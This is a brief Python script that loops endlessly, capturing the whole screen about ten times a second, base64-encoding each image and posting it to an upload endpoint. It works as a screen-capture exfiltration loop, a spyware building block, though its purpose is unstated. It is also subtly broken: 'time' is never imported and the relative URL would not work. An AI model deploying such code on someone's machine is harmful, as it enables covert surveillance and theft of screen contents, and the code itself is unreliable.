from PIL import ImageGrab
import pyautogui
import requests
import base64

w, h = pyautogui.size()

while True:
    ImageGrab.grab((0, 0, w, h)).save('image.png')

    with open('image.png', 'rb') as file:
        bytes = file.read()
    encoded = base64.b64encode(bytes).decode("utf8")

    requests.post('api/upload', json={'image': encoded})
    time.sleep(0.1)
